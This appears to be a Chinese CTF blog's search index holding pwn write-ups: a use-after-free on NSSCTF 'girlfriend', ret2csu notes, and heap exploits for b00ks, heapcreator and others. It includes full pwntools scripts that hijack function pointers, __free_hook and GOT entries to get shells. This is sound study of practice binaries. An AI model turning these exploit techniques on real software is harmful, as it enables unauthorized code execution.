<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>nssctf_girfriend</title>
      <link href="/2024/09/21/nssctf-girfriend/"/>
      <url>/2024/09/21/nssctf-girfriend/</url>
      
        <content type="html"><![CDATA[<p>nssctf_girlfriend<span id="more"></span></p><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><p><img src="/2024/09/21/nssctf-girfriend/girlfriend_1.png"></p><p>64位，开启了Canary和NX</p><h2 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h2><h3 id="menu"><a href="#menu" class="headerlink" title="menu"></a>menu</h3><p><img src="/2024/09/21/nssctf-girfriend/girlfriend_2.png"></p><p>menu函数，经典的堆题形式，add，delete，show</p><h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><p><img src="/2024/09/21/nssctf-girfriend/girlfriend_3.png"></p><p>首先有一个girlfriend_list位于bss段用于存储每一个grilfriend_chunk的地址，每一个girlfriend malloc(0x10)的空间，第一个字节储存print_girlfriend_name函数的地址，第二个字节储存girlfriend_name的地址，用户输入size给v3给girlfriend_name malloc(v3)的空间，结构如下图</p><p><img src="/2024/09/21/nssctf-girfriend/girlfriend_4.png"></p><h3 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h3><p><img src="/2024/09/21/nssctf-girfriend/girlfriend_5.png"></p><p>输入下标，如果是0-9先free name_point再free girlfriend_point，这点会在后续fastbin中体现</p><h3 id="show"><a href="#show" class="headerlink" title="show"></a>show</h3><p><img src="/2024/09/21/nssctf-girfriend/girlfriend_6.png"></p><p>输出girlfriend_name</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>在delete中看到只free而没有将指针置NULL经典的UAF，先malloc(0x10)两个，此时chunk如add函数解释的图所示。再free掉他们，此时fastbin如下</p><p><img src="/2024/09/21/nssctf-girfriend/girlfriend_7.png"></p><p>此时再malloc(0x20)会将girlfriend2_chunk用掉，由于malloc(0x20)所以这段空间会在heap里面，而不是从fastbin中拿，此时再malloc(0x10)，girlfriend4_chunk会用掉2_name同时4_name会用掉girlfriend1_chunk那此时就可以将print_girlfriend1_name地址换成backdoor。再show(0)。</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>, log_level = <span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">'node4.anna.nssctf.cn'</span>, <span class="number">28690</span>)</span><br><span class="line"><span class="comment">#io = process('./girlfriend')</span></span><br><span class="line">elf = ELF(<span class="string">'./girlfriend'</span>)</span><br><span class="line">backdoor = elf.symbols[<span class="string">'backdoor'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, name</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b'choice :'</span>, <span class="string">b'1'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b'size is :'</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    io.sendlineafter(<span class="string">b'name is :'</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b'choice :'</span>, <span class="string">b'2'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b'Index :'</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b'choice :'</span>, <span class="string">b'3'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b'Index :'</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">b'choice :'</span>, <span class="string">b'4'</span>)</span><br><span class="line">    </span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">'mg1'</span>)</span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">'mg2'</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">'mg3'</span>)</span><br><span class="line">add(<span class="number">0x10</span>, p64(backdoor))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF-wp-0904</title>
      <link href="/2024/09/04/NSSCTF-wp-0904/"/>
      <url>/2024/09/04/NSSCTF-wp-0904/</url>
      
        <content type="html"><![CDATA[<p>NSSCTF-wp-0904<span id="more"></span></p><h1 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h1><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><p><img src="/2024/09/04/NSSCTF-wp-0904/ret2scu_1.png"></p><p>64位程序，开启了NX</p><h2 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h2><p><img src="/2024/09/04/NSSCTF-wp-0904/ret2scu_2.png"></p><p>只有一个函数存在栈溢出，但不存在其他可利用的漏洞，也没有后门函数。</p><p><img src="/2024/09/04/NSSCTF-wp-0904/ret2scu_4.png"></p><p>灭有足够的gadgets去泄露libc基址</p><p>想到可以利用ret2scu构造gadgets劫持程序流</p><p><img src="/2024/09/04/NSSCTF-wp-0904/ret2scu_3.png"></p><p>从0x4012AA到0x4012B2可以通过栈控制rbx,rbp,r12,r13,r14,r15的值，从0x401290到0x401296可以通过r14,r13,r12d（r12的低32位）分别控制rdx,rsi,edi（rdi的低32位）而rdx,rsi,rdi正是x64位系统的寄存器调用的前三个，再控制r15为目标函数的地址，rbx为0则可以调用目标函数，控制rbx + 1 == rbp则不会调用loc_401290这里可以简单地设置rbx = 0，rbp = 1。</p>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>heap_practice</title>
      <link href="/2024/07/28/heap-practice/"/>
      <url>/2024/07/28/heap-practice/</url>
      
        <content type="html"><![CDATA[<p>heap_practice<span id="more"></span></p><h1 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off_by_one"></a>off_by_one</h1><h2 id="Asis-2016-b00ks"><a href="#Asis-2016-b00ks" class="headerlink" title="Asis_2016_b00ks"></a>Asis_2016_b00ks</h2><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><img src="/2024/07/28/heap-practice/b00ks_1.png" style="zoom:80%;">  64位，除了canary其他保护全开<h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><h4 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h4><p>是一个menu<br><img src="/2024/07/28/heap-practice/b00ks_2.png" style="zoom:80%;">      </p><h4 id="create函数"><a href="#create函数" class="headerlink" title="create函数"></a>create函数</h4><p><img src="/2024/07/28/heap-practice/b00ks_3.png"><br>上图是创建一个book的过程分析可得有三个chunk和一个struct，三个chunk分别是book_name,description,book_ctrl。struct是书的结构包含book_id,name_ptr,descrption_ptr,description_size  </p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">book</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    <span class="type">int</span> book_id;</span><br><span class="line">    <span class="type">char</span>* name_ptr;</span><br><span class="line">    <span class="type">char</span>* description_ptr;</span><br><span class="line">    <span class="type">int</span> description_size;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><img src="/2024/07/28/heap-practice/b00ks_4.png"><br>三个chunk的结构如下<img src="/2024/07/28/heap-practice/b00ks_5.png" style="zoom:80%;"> </p><h4 id="delete函数"><a href="#delete函数" class="headerlink" title="delete函数"></a>delete函数</h4><img src="/2024/07/28/heap-practice/b00ks_6.png" style="zoom:80%;">    主要是free三个chunk<h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p><img src="/2024/07/28/heap-practice/b00ks_7.png"><br>程序自己实现了一个read函数，但是其中存在off_by_one漏洞<br>函数中  </p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*ptr = <span class="number">0</span>;</span><br></pre></td></tr></tbody></table></figure><p>会将最后一个’\x0a’替换为’\x00’</p><p><img src="/2024/07/28/heap-practice/b00ks_8.png">  </p><p>可以看到author_name指向bss段的0x20长度的位置，偏移为0x202040<del>0x20205F。紧接着是book_order_arry指向的是0x202060</del>0x2020FF储存的是book的指针。</p><p><img src="/2024/07/28/heap-practice/b00ks_9.png"><br><img src="/2024/07/28/heap-practice/b00ks_10.png"></p><p>当i == number时，\x00会放在0x202060，那么book_order_arry写入book的指针时会将\x00覆写，此时执行show函数时会将book_ptr输出。<br><img src="/2024/07/28/heap-practice/b00ks_11.png"><br>程序提供了设置author_name的函数这样可以利用off_by_null将\x00覆盖到book_order_arry的指针的低字节，即从0x0000555555603710到0x0000555555603700，</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>创建 2 个 book，通过off_by_one，使得 book1_ctrl 指针指向 book1_description 中；然后在book1_description 中伪造一个 fake_book1_ctrl，使得其中的 book1_description_ptr 指向 book2_description_ptr；通过先后修改 book1_description 和 book2_description，从而实现任意地址写任意内容的功能。book2 的 description 的大小越大越好 ，这样会通过 mmap () 函数去分配堆空间，而该堆地址与 libc 的基址相关，这样通过泄露该堆地址可以计算出 libc 的基址。</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p><img src="/2024/07/28/heap-practice/b00ks_12.png"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>, log_level = <span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">'./b00ks'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./b00ks'</span>)</span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createbook</span>(<span class="params">name_size,name,des_size,des</span>):</span><br><span class="line">io.readuntil(<span class="string">b"&gt; "</span>)</span><br><span class="line">io.sendline(<span class="string">b"1"</span>)</span><br><span class="line">io.readuntil(<span class="string">b": "</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(name_size))</span><br><span class="line">io.readuntil(<span class="string">b": "</span>)</span><br><span class="line">io.sendline(name)</span><br><span class="line">io.readuntil(<span class="string">b": "</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(des_size))</span><br><span class="line">io.readuntil(<span class="string">b": "</span>)</span><br><span class="line">io.sendline(des)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printbook</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">io.readuntil(<span class="string">b"&gt; "</span>)</span><br><span class="line">io.sendline(<span class="string">b"4"</span>)</span><br><span class="line">io.readuntil(<span class="string">b": "</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">id</span>):</span><br><span class="line">book_id=<span class="built_in">int</span>(io.readline()[:-<span class="number">1</span>])</span><br><span class="line">io.readuntil(<span class="string">b": "</span>)</span><br><span class="line">book_name=io.readline()[:-<span class="number">1</span>]</span><br><span class="line">io.readuntil(<span class="string">b": "</span>)</span><br><span class="line">book_des=io.readline()[:-<span class="number">1</span>]</span><br><span class="line">io.readuntil(<span class="string">b": "</span>)</span><br><span class="line">book_author=io.readline()[:-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">return</span> book_id,book_name,book_des,book_author</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createname</span>(<span class="params">name</span>):</span><br><span class="line">io.readuntil(<span class="string">b"name: "</span>)</span><br><span class="line">io.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">changename</span>(<span class="params">name</span>):</span><br><span class="line">io.readuntil(<span class="string">b"&gt; "</span>)</span><br><span class="line">io.sendline(<span class="string">b"5"</span>)</span><br><span class="line">io.readuntil(<span class="string">b": "</span>)</span><br><span class="line">io.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">editbook</span>(<span class="params">book_id,new_des</span>):</span><br><span class="line">io.readuntil(<span class="string">b"&gt; "</span>)</span><br><span class="line">io.sendline(<span class="string">b"3"</span>)</span><br><span class="line">io.readuntil(<span class="string">b": "</span>)</span><br><span class="line">io.writeline(<span class="built_in">str</span>(book_id))</span><br><span class="line">io.readuntil(<span class="string">b": "</span>)</span><br><span class="line">io.sendline(new_des)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deletebook</span>(<span class="params">book_id</span>):</span><br><span class="line">io.readuntil(<span class="string">b"&gt; "</span>)</span><br><span class="line">io.sendline(<span class="string">b"2"</span>)</span><br><span class="line">io.readuntil(<span class="string">b": "</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(book_id))</span><br><span class="line"></span><br><span class="line">createname(<span class="string">b"A"</span>*<span class="number">32</span>)</span><br><span class="line">createbook(<span class="number">32</span>,<span class="string">b"a"</span>,<span class="number">140</span>,<span class="string">b"a"</span>)</span><br><span class="line">createbook(<span class="number">0x21000</span>,<span class="string">b"a"</span>,<span class="number">0x21000</span>,<span class="string">b"b"</span>)</span><br><span class="line"></span><br><span class="line">book_id_1,book_name,book_des,book_author=printbook(<span class="number">1</span>)</span><br><span class="line">book1_addr=u64(book_author[<span class="number">32</span>:<span class="number">32</span>+<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))</span><br><span class="line">log.success(<span class="string">"book1_address:"</span>+<span class="built_in">hex</span>(book1_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'a'</span>*<span class="number">0x10</span> + p64(<span class="number">1</span>) + p64(book1_addr+<span class="number">0x38</span>) + p64(book1_addr+<span class="number">0x40</span>) + p64(<span class="number">0xffff</span>)</span><br><span class="line">editbook(book_id_1,payload)</span><br><span class="line">changename(<span class="string">b"A"</span>*<span class="number">32</span>)</span><br><span class="line">book_id_1,book_name,book_des,book_author=printbook(<span class="number">1</span>)</span><br><span class="line">book2_name_addr=u64(book_name.ljust(<span class="number">8</span>,<span class="string">b"\x00"</span>))</span><br><span class="line">book2_des_addr=u64(book_des.ljust(<span class="number">8</span>,<span class="string">b"\x00"</span>))</span><br><span class="line">log.success(<span class="string">"book2 name addr:"</span>+<span class="built_in">hex</span>(book2_name_addr))</span><br><span class="line">log.success(<span class="string">"book2 des addr:"</span>+<span class="built_in">hex</span>(book2_des_addr))</span><br><span class="line">libc_base=book2_des_addr-<span class="number">0x22010</span></span><br><span class="line">log.success(<span class="string">"libc base:"</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line">one_gadget=libc_base+<span class="number">0x4f322</span></span><br><span class="line">log.success(<span class="string">"free_hook:"</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">log.success(<span class="string">"one_gadget:"</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span class="line">editbook(<span class="number">1</span>,p64(free_hook)*<span class="number">2</span>)</span><br><span class="line">editbook(<span class="number">2</span>,p64(one_gadget))</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">deletebook(<span class="number">2</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><h2 id="2015-plaidctf-datastore"><a href="#2015-plaidctf-datastore" class="headerlink" title="2015_plaidctf_datastore"></a>2015_plaidctf_datastore</h2><h3 id="checksec-1"><a href="#checksec-1" class="headerlink" title="checksec"></a>checksec</h3><p><img src="/2024/07/28/heap-practice/datastore_1.png"><br>64位程序，保护全开</p><h1 id="chunk-extend-shrink"><a href="#chunk-extend-shrink" class="headerlink" title="chunk-extend-shrink"></a>chunk-extend-shrink</h1><h2 id="hitcontraning-lab13"><a href="#hitcontraning-lab13" class="headerlink" title="hitcontraning_lab13"></a>hitcontraning_lab13</h2><h3 id="checksec-2"><a href="#checksec-2" class="headerlink" title="checksec"></a>checksec</h3><p><img src="/2024/07/28/heap-practice/lab13_1.png"><br>64位操作系统，开启了canary和nx</p><h3 id="ida-1"><a href="#ida-1" class="headerlink" title="ida"></a>ida</h3><p>自定义的堆分配器，每个堆主要有两个成员：大小与内容指针</p><h4 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h4><p><img src="/2024/07/28/heap-practice/lab13_2.png"><br>在这个函数中对content重写时size + 1这里存在off_by_one漏洞</p><h3 id="动调"><a href="#动调" class="headerlink" title="动调"></a>动调</h3><p><img src="/2024/07/28/heap-practice/lab13_4.png"><br>结构如上<br><img src="/2024/07/28/heap-practice/lab13_3.png"><br>利用edit的off_by_one漏洞可以对next_chunk进行修改，达到heaparry和heap指针的互换</p><p>修改前<br><img src="/2024/07/28/heap-practice/lab13_5.png"> <img src="/2024/07/28/heap-practice/lab13_7.png" style="zoom:67%;"></p><p>修改后<br><img src="/2024/07/28/heap-practice/lab13_6.png"><img src="/2024/07/28/heap-practice/lab13_8.png" style="zoom:67%;"></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>, log_level = <span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">'./heapcreator'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./heapcreator'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size, content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b':'</span>)</span><br><span class="line">    io.sendline(<span class="string">b'1'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b':'</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b':'</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b':'</span>)</span><br><span class="line">    io.sendline(<span class="string">b'2'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b':'</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b':'</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b':'</span>)</span><br><span class="line">    io.sendline(<span class="string">b'3'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b':'</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b':'</span>)</span><br><span class="line">    io.sendline(<span class="string">b'4'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b':'</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">create(<span class="number">0x18</span>, <span class="string">b'aaaa'</span>)</span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b'bbbb'</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b'/bin/sh\x00'</span> + <span class="string">b'a'</span> * <span class="number">0x10</span> + <span class="string">b'\x41'</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x30</span>, p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0x30</span>) + p64(free_got))</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">b'Content : '</span>)</span><br><span class="line">data = io.recvuntil(<span class="string">b'Done !'</span>)</span><br><span class="line">free_addr = u64(data.split(<span class="string">b'\n'</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">libc_base = free_addr - libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">log.success(<span class="string">'libc base addr: '</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">edit(<span class="number">1</span>, p64(system_addr))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><h1 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin_attack"></a>fastbin_attack</h1><h2 id="2014-hack-lu-oreo"><a href="#2014-hack-lu-oreo" class="headerlink" title="2014 hack.lu oreo"></a>2014 hack.lu oreo</h2><h3 id="checksec-3"><a href="#checksec-3" class="headerlink" title="checksec"></a>checksec</h3><p><img src="/2024/07/28/heap-practice/oreo_1.png"></p><p>32位程序，开启了Canary和NX保护</p><h3 id="ida-2"><a href="#ida-2" class="headerlink" title="ida"></a>ida</h3><p>步枪的基本结构如下</p><p><img src="/2024/07/28/heap-practice/oreo_2.png"></p><h2 id="2015-9447-CTF-Search-Engine"><a href="#2015-9447-CTF-Search-Engine" class="headerlink" title="2015 9447 CTF : Search Engine"></a>2015 9447 CTF : Search Engine</h2><h3 id="checksec-4"><a href="#checksec-4" class="headerlink" title="checksec"></a>checksec</h3><p><img src="/2024/07/28/heap-practice/search_1.png"></p><p>64位程序，除了PIE其他保护全开</p><h3 id="ida-gdb"><a href="#ida-gdb" class="headerlink" title="ida + gdb"></a>ida + gdb</h3>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>heap_study</title>
      <link href="/2024/07/15/heap-study/"/>
      <url>/2024/07/15/heap-study/</url>
      
        <content type="html"><![CDATA[<p>heap_study<span id="more"></span></p><figure class="highlight markdown"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">+-------------------+  &lt;- chunk起始地址(低地址)</span><br><span class="line">| Prev Size (可选)  |</span><br><span class="line">+-------------------+</span><br><span class="line">|      Size         |</span><br><span class="line">+-------------------+</span><br><span class="line">|       fd          |</span><br><span class="line">+-------------------+</span><br><span class="line">|       bk          |</span><br><span class="line">+-------------------+</span><br><span class="line">|                   |</span><br><span class="line">|     用户数据       |</span><br><span class="line">|                   |</span><br><span class="line">+-------------------+  &lt;- chunk结束地址(高地址)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h1 id="Chunk-Extend-and-Overlapping"><a href="#Chunk-Extend-and-Overlapping" class="headerlink" title="Chunk Extend and Overlapping"></a>Chunk Extend and Overlapping</h1><p><strong>条件</strong>  </p><ul><li>程序中存在基于堆的漏洞</li><li>漏洞可以控制 chunk header 中的数据</li></ul><p><strong>chunk extend可以做什么</strong></p><p>这种技术并不能直接控制程序的执行流程，但是可以控制 chunk 中的内容。如果 chunk 存在字符串指针、函数指针等，就可以利用这些指针来进行信息泄漏和控制执行流程。此外通过 extend 可以实现 chunk overlapping，通过 overlapping 可以控制 chunk 的 fd/bk 指针从而可以实现 fastbin attack 等利用。</p><h2 id="对inuse的fastbin进行extend"><a href="#对inuse的fastbin进行extend" class="headerlink" title="对inuse的fastbin进行extend"></a>对inuse的fastbin进行extend</h2><p><img src="/2024/07/15/heap-study/overlapping_1.png"></p><h2 id="对inuse的smallbin进行extend"><a href="#对inuse的smallbin进行extend" class="headerlink" title="对inuse的smallbin进行extend"></a>对inuse的smallbin进行extend</h2><p><img src="/2024/07/15/heap-study/overlapping_2.png"></p><h2 id="对-free-的-smallbin-进行-extend"><a href="#对-free-的-smallbin-进行-extend" class="headerlink" title="对 free 的 smallbin 进行 extend"></a>对 free 的 smallbin 进行 extend</h2><p>与前一个相同只不过不需要防止与top_chunk合并</p><h2 id="通过-extend-后向-overlapping"><a href="#通过-extend-后向-overlapping" class="headerlink" title="通过 extend 后向 overlapping"></a>通过 extend 后向 overlapping</h2><h2 id="通过-extend-前向-overlapping"><a href="#通过-extend-前向-overlapping" class="headerlink" title="通过 extend 前向 overlapping"></a>通过 extend 前向 overlapping</h2><p><img 